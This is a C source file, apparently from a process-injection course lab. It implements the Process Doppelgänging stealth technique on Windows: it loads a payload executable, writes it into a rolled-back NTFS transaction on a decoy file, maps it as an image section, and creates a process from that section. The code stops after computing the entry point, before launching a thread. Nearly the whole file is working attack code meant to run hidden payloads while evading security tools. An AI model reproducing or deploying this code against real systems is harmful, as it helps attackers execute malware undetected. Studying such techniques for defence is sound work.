#include <windows.h>
#include <stdio.h>
#include "dopple.h"

// helper function - GetPayloadBuffer
BYTE* GetPayloadBuffer(OUT size_t& p_size) {
    HANDLE hFile = CreateFileW(L"C:\\Users\\vagrant\\Desktop\\CPIA-Work\\ProcessInjection\\ProcessDoppleganging\\Payload64\\payload64.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        perror("[-] Unable to open the payload file...\n");
        exit(-1);
    }
    p_size = GetFileSize(hFile, 0);
    BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (bufferAddress == NULL) {
        perror("[-] Failed to allocate memory to the payload buffer...\n");
        exit(-1);
    }
    DWORD bytesRead = 0;
    if(!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL)) {
        perror("[-] Failed to read the payload buffer.... \n");
        exit(-1);
    }
    return bufferAddress;
}

BOOL CreateNTFSTransaction(OUT HANDLE &phTransaction, OUT HANDLE &phTransactedFile) {
    _NtCreateTransaction pNtCreateTransaction = (_NtCreateTransaction)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateTransaction");
    if (pNtCreateTransaction == NULL) {
        perror("[-] Failed to resolve NtCreateTranscation api\n");
        exit(-1);
    }
    HANDLE hTransaction = NULL;
    HANDLE hFileTransacted = INVALID_HANDLE_VALUE;
    _OBJECT_ATTRIBUTES objAttr;
    WCHAR targetPath[MAX_PATH];
    lstrcpyW(targetPath, L"C:\\temp\\mynotes.txt");

    printf("[+] Transact\n");
    // Create NTFS transaction object
    InitializeObjectAttributes(&objAttr, NULL, 0 , NULL, NULL);
    pNtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &objAttr, NULL, NULL, 0, 0, 0, NULL, NULL);
    if (hTransaction == NULL) {
        perror("[-] Error creating transaction... \n");
        exit(-1);
    }
    printf("[+] NTFS transaction object created\n");

    // open target file for transaction
    hFileTransacted = CreateFileTransactedW(targetPath, GENERIC_READ | GENERIC_WRITE, 0, NULL,
    OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
    printf("[+]\t Opened dummy file: %s\n", targetPath);
    if (hFileTransacted == INVALID_HANDLE_VALUE) {
        printf("[-]\t error opening dummy file for transaction %d\n", GetLastError());
        exit(-1);
    }

    phTransaction = hTransaction;
    phTransactedFile = hFileTransacted;
    return TRUE;
}

// Load - the second step of process doppelganging technique
HANDLE CreateSectionFromTransacedFile(HANDLE hFileTransacted) {
    printf("[+]Load\n");
    _NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
    HANDLE hSection = NULL;
    if (pNtCreateSection == NULL) {
        perror("[-] Failed to resolve NtCreateSection api ...\n");
        exit(-1);
    }
    // SEC IMAGE - mapping the transacted file to an execuable image. THis performs PE header validation.
    pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0 , PAGE_READONLY, SEC_IMAGE, hFileTransacted);
    if (hSection == NULL) {
        perror("[-] Error creating section from the transacted file\n");
        exit(-1);
    }
    printf("[+]\t Created section from transacted file");
    return hSection;
}

// Step 3 - Rollback file transaction
BOOL RollbackTransaction(HANDLE hTransaction) {
    printf("[+] Rollback transaction\n");
    NTSTATUS status;
    _NtRollbackTransaction pNtRollbackTransaction = (_NtRollbackTransaction)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRollbackTransaction");
    if (pNtRollbackTransaction == NULL) {
        perror("[-] Failed to resolve the NtRollbackTransaction api\n");
        exit(-1);
    }

    status = pNtRollbackTransaction(hTransaction, TRUE);
    if(!NT_SUCCESS(status)){
        perror("[-] Failed to rollback the transaction\n");
        exit(-1);
    }

    printf("[+] Transaction rolled back\n");
    return TRUE;
}

BOOL ProcessDoppleganging(BYTE *payloadBuffer, DWORD payloadSize) {
    // init necessary variables
    HANDLE hTransaction = NULL;
    HANDLE hTransactedFile = INVALID_HANDLE_VALUE;
    HANDLE hSection = NULL;
    HANDLE hProcess = NULL;
    DWORD bytesWritten = 0;
    DWORD returnLength = 0;
    ULONG_PTR entryPoint = 0;
    PEB* remotePEB;
    UNICODE_STRING uTargetFile;
    PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
    NTSTATUS status;
    PROCESS_BASIC_INFORMATION pbi;
    HANDLE hThread;
    // resolving requisite NT apis
    _NtCreateProcessEx pNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateProcessEx");
    if (pNtCreateProcessEx == NULL) {
        perror("[-] Unable to resolve NtCreateProcessEx API... \n");
        exit(-1);
    }
    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (pNtQueryInformationProcess == NULL) {
        perror("[-] Unable to resolve NtQueryInformationProcess API... \n");
        exit(-1);
    }
    _NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
    if (pNtReadVirtualMemory == NULL) {
        perror("[-] Unable to resolve NtReadVirtualMemory API... \n");
        exit(-1);
    }
    _RtlImageNTHeader pRtlImageNTHeader = (_RtlImageNTHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
    if (pRtlImageNTHeader == NULL) {
        perror("[-] Unable to resolve RtlImageNTHeader API... \n");
        exit(-1);
    }
    _RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateProcessParametersEx");
    if (pRtlCreateProcessParametersEx == NULL) {
        perror("[-] Unable to resolve RtlCreateProcessParametersEx API... \n");
        exit(-1);
    }
    _RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
    if (pRtlInitUnicodeString == NULL) {
        perror("[-] Unable to resolve RtlInitUnicodeString API... \n");
        exit(-1);
    }
    _NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    if (pNtCreateThreadEx == NULL) {
        perror("[-] Unable to resolve NtCreateThreadEx API... \n");
        exit(-1);
    }
    _NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    if (pNtAllocateVirtualMemory == NULL) {
        perror("[-] Unable to resolve NtAllocateVirtualMemory API... \n");
        exit(-1);
    }
    _NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    if (pNtWriteVirtualMemory == NULL) {
        perror("[-] Unable to resolve NtWriteVirtualMemory API... \n");
        exit(-1);
    }
    _ZwClose pZwClose = (_ZwClose)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwClose");
    if (pZwClose == NULL) {
        perror("[-] Unable to resolve ZwClose API... \n");
        exit(-1);
    }
    WCHAR targetExe[MAX_PATH];
    lstrcpyW(targetExe, L"C:\\temp\\mynotes.txt");

    // Doppelganging step - 1 : Transact
    CreateNTFSTransaction(hTransaction, hTransactedFile);

    // Write payload buffer into the transaction
    if(!WriteFile(hTransactedFile, payloadBuffer, payloadSize, &bytesWritten, NULL)) {
        perror("[-] Failed to write payload to the transaction\n");
        exit(-1);
    }
    printf("[+]\t payload written to the transaction file\n");
    // create a section in the transacted file
    // This section will form the base for the new process.
    hSection = CreateSectionFromTransacedFile(hTransactedFile);
    if (hSection == NULL) {
        perror("[-]\t Invalid section handle\n");
        exit(-1);
    }

    // Step 3 - Rollback. Since the payload is loaded inside the section, the payload inside the transaction is no longer necessary.
    // thus, rollback the transaction.
    RollbackTransaction(hTransaction);

    // Step 4 - Animate. The core of the doppelganging technique.
    // first, create a process with transacted section
    status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
    if (!NT_SUCCESS(status)) {
        printf("[-] Error creating process from section: %d\n", GetLastError());
        exit(-1);
    }
    printf("[+] Successfully created process from section\n");

    // next, get the process information
    status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
    if (!NT_SUCCESS(status)) {
        printf("[-] Error querying process information: %d\n", GetLastError());
        exit(-1);
    }
    printf("[+] Successfully created process from section\n");

    // next, get entry point from the loaded PEB
    BYTE imageData[0x1000];
    ZeroMemory(imageData, sizeof(imageData));
    status = pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &imageData, 0x1000, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] Error reading process memory: %d\n", GetLastError());
        exit(-1);
    }
    printf("[+] Base address of the target process PEB: %p\n", (ULONG_PTR)(((PPEB)imageData)->ImageBaseAddress));
    entryPoint = (pRtlImageNTHeader(payloadBuffer))->OptionalHeader.AddressOfEntryPoint;
    printf("[+] Image base address of payload buffer in target process: %p\n", entryPoint);
    entryPoint += (ULONG_PTR)((PPEB)imageData)->ImageBaseAddress;
    printf("[+] Entry point of the payload buffer: %p\n", entryPoint);

    WCHAR targetPath[MAX_PATH];
    

    return TRUE;
}


int main() {
    size_t payloadSize = 0;
    BYTE* payloadBuffer = GetPayloadBuffer(payloadSize);
    BOOL isSuccess = ProcessDoppleganging(payloadBuffer, (DWORD)payloadSize);
    //system("pause");
}